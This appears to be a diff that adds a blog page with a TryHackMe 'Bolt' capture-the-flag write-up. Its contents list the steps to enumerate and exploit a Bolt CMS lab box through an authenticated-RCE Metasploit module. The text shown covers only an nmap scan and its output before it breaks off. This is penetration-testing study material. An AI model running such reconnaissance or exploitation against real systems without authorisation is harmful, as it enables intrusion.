@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Bolt - THM Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thingy for Bolt TryhackMe&amp;rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all." />
+<meta name="keywords" content=", hacking, tryHackme, writeups" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://tzero86-bits.netlify.app/posts/bolt_writeup/" />
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+    <title>
+        
+            Bolt_writeup.sh :: tzero86.bits  — hacking notes, tools and rants.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Bolt_writeup.sh">
+<meta itemprop="description" content="Bolt - THM Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thingy for Bolt TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.">
+<meta itemprop="datePublished" content="2020-08-26T21:34:28-04:00" />
+<meta itemprop="dateModified" content="2020-08-26T21:34:28-04:00" />
+<meta itemprop="wordCount" content="1838">
+<meta itemprop="image" content="https://tzero86-bits.netlify.app/"/>
+
+
+
+<meta itemprop="keywords" content="hacking,tryHackme,writeups," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tzero86-bits.netlify.app/"/>
+
+<meta name="twitter:title" content="Bolt_writeup.sh"/>
+<meta name="twitter:description" content="Bolt - THM Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thingy for Bolt TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-26 21:34:28 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">tzero86.bits</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://tzero86-bits.netlify.app/page/about/">About me</a></li><li><a href="https://tzero86-bits.netlify.app/posts/">Blog Posts</a></li><li><a href="https://tzero86-bits.netlify.app/">Home</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://tzero86-bits.netlify.app/posts/bolt_writeup/">Bolt_writeup.sh</a>
+      </h1>
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#task-1-what-port-number-has-a-web-server-with-a-cms-running">[Task 1] What port number has a web server with a CMS running?</a></li>
+    <li><a href="#task-2-what-is-the-username-we-can-find-in-the-cms">[Task 2] What is the username we can find in the CMS?</a></li>
+    <li><a href="#task-3-what-is-the-password-we-can-find-for-the-username">[Task 3] What is the password we can find for the username?</a></li>
+    <li><a href="#task-4-what-version-of-the-cms-is-installed-on-the-server-ex-name-111">[Task 4] What version of the CMS is installed on the server? (Ex: Name 1.1.1)</a></li>
+    <li><a href="#task-5-theres-an-exploit-for-a-previous-version-of-this-cms-which-allows-authenticated-rce-find-it-on-exploit-db-whats-its-edb-id">[Task 5] There&rsquo;s an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What&rsquo;s its EDB-ID?</a></li>
+    <li><a href="#task-6-metasploit-recently-added-an-exploit-module-for-this-vulnerability-whats-the-full-path-for-this-exploit-ex-exploit">[Task 6] Metasploit recently added an exploit module for this vulnerability. What&rsquo;s the full path for this exploit? (Ex: exploit/&hellip;.)</a></li>
+    <li><a href="#task-7-set-the-lhost-lport-rhost-username-password-in-msfconsole-before-running-the-exploit">[Task 7] Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit</a></li>
+    <li><a href="#task-8-look-for-flagtxt-inside-the-machine">[Task 8] Look for flag.txt inside the machine.</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+        <img src="/img/bolt_cover.gif" class="post-cover" />
+      
+
+      <div class="post-content">
+        <h1 id="bolt---thm-room">Bolt - THM Room</h1>
+<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thingy for Bolt TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)</p>
+<p>Enjoy!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/bolt">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+</ul>
+<h2 id="task-1-what-port-number-has-a-web-server-with-a-cms-running">[Task 1] What port number has a web server with a CMS running?</h2>
+<p>Let&rsquo;s fire up an <strong>nmap</strong> scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bolt<span style="color:#f92672">]</span>
+└─$ nmap -A -sC -sV -T4 10.10.105.96
+
+</code></pre></div><p>While nmap runs let&rsquo;s take a look at the IP on the browser to see if there is any page being served. We get the default apache page:</p>
+<p><img src="https://i.imgur.com/zVMGPMS.png" alt="Apache2 Ubuntu default page"></p>
+<p>and if we try to navigate to any other URL we can get the specific version:</p>
+<p><img src="https://i.imgur.com/o5N22Ss.png" alt="Apache2 version"></p>
+<p>Let&rsquo;s check nmap results:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bolt<span style="color:#f92672">]</span>
+└─$ nmap -A -sC -sV -T4 10.10.105.96
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-26 20:22 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.105.96
+Host is up <span style="color:#f92672">(</span>0.38s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+8***/tcp open  http    <span style="color:#f92672">(</span>PHP 7.2.32-1<span style="color:#f92672">)</span>
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 <span style="color:#ae81ff">404</span> Not Found
+|     Date: Thu, <span style="color:#ae81ff">27</span> Aug <span style="color:#ae81ff">2020</span> 00:23:45 GMT
+|     Connection: close
+|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
+|     Cache-Control: private, must-revalidate
+|     Date: Thu, <span style="color:#ae81ff">27</span> Aug <span style="color:#ae81ff">2020</span> 00:23:45 GMT
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+|     pragma: no-cache
+|     expires: -1
+|     X-Debug-Token: 0531cf
+|     &lt;!doctype html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;
+|     &lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/theme/base-2018/css/bulma.css?8ca0842ebb&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/theme/base-2018/css/theme.css?6cb66bfe9f&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;generator&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Bolt&#34;</span>&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#main-content&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vis
+</span><span style="color:#e6db74">|   GetRequest: 
+</span><span style="color:#e6db74">|     HTTP/1.0 200 OK
+</span><span style="color:#e6db74">|     Date: Thu, 27 Aug 2020 00:23:44 GMT
+</span><span style="color:#e6db74">|     Connection: close
+</span><span style="color:#e6db74">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
+</span><span style="color:#e6db74">|     Cache-Control: public, s-maxage=600
+</span><span style="color:#e6db74">|     Date: Thu, 27 Aug 2020 00:23:44 GMT
+</span><span style="color:#e6db74">|     Content-Type: text/html; charset=UTF-8
+</span><span style="color:#e6db74">|     X-Debug-Token: e716a7
+</span><span style="color:#e6db74">|     &lt;!doctype html&gt;
+</span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en-GB<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;head&gt;
+</span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>utf-8<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1.0<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;
+</span><span style="color:#e6db74">|     &lt;link href=&#34;</span>https://fonts.googleapis.com/css?family<span style="color:#f92672">=</span>Bitter|Roboto:400,400i,700<span style="color:#e6db74">&#34; rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/theme/base-2018/css/bulma.css?8ca0842ebb<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/theme/base-2018/css/theme.css?6cb66bfe9f<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>generator<span style="color:#e6db74">&#34; content=&#34;</span>Bolt<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>canonical<span style="color:#e6db74">&#34; href=&#34;</span>http://0.0.0.0:8000/<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;/head&gt;
+</span><span style="color:#e6db74">|_    &lt;body class=&#34;</span>front<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|_http-generator: Bolt
+</span><span style="color:#e6db74">|_http-title: Bolt | A hero is unleashed
+</span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span><span style="color:#e6db74">SF-Port8000-TCP:V=7.80%I=7%D=8/26%Time=5F46FCF0%P=x86_64-pc-linux-gnu%r(Ge
+</span><span style="color:#e6db74">SF:tRequest,1EFB,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:2020<span style="color:#ae81ff">\x</span>2000:23:44<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>X-Powered-By:<span style="color:#ae81ff">\x</span>20PHP
+SF:/7<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\.</span>32-1<span style="color:#ae81ff">\+</span>ubuntu18<span style="color:#ae81ff">\.</span>04<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\+</span>deb<span style="color:#ae81ff">\.</span>sury<span style="color:#ae81ff">\.</span>org<span style="color:#ae81ff">\+</span>1<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20pu
+SF:blic,<span style="color:#ae81ff">\x</span>20s-maxage<span style="color:#f92672">=</span>600<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:23:44
+SF:<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>X-Debug-Toke
+SF:n:<span style="color:#ae81ff">\x</span>20e716a7<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-GB<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>u
+SF:tf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">20</span>
+SF:content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Bolt<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\|\x</span>20A
+SF:<span style="color:#ae81ff">\x</span>20hero<span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20unleashed&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;l
+SF:ink<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https://fonts<span style="color:#ae81ff">\.</span>googleapis<span style="color:#ae81ff">\.</span>com/css<span style="color:#ae81ff">\?</span>family<span style="color:#f92672">=</span>Bitter<span style="color:#ae81ff">\|</span>Roboto
+SF::400,400i,700<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/bulma<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:?8ca0842ebb<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>styleshe
+SF:et<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/theme<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>6cb66bfe9f<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>generator<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Bolt<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>canonical<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://0<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span>0:8000/<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body<span style="color:#ae81ff">\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>front<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>
+SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;a<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#34;)%r(FourOhFourRequest,152B,&#34;</span>HTTP/1
+SF:<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:
+SF:23:45<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>X-Powered-By:<span style="color:#ae81ff">\x</span>20PHP/7<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\.</span>32-1
+SF:<span style="color:#ae81ff">\+</span>ubuntu18<span style="color:#ae81ff">\.</span>04<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\+</span>deb<span style="color:#ae81ff">\.</span>sury<span style="color:#ae81ff">\.</span>org<span style="color:#ae81ff">\+</span>1<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20private,<span style="color:#ae81ff">\x</span>20m
+SF:ust-revalidate<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:23:45<span style="color:#ae81ff">\x</span>20GMT
+SF:<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>pragma:<span style="color:#ae81ff">\x</span>20no-cache
+SF:<span style="color:#ae81ff">\r\n</span>expires:<span style="color:#ae81ff">\x</span>20-1<span style="color:#ae81ff">\r\n</span>X-Debug-Token:<span style="color:#ae81ff">\x</span>200531cf<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html
+SF:&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial
+SF:-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
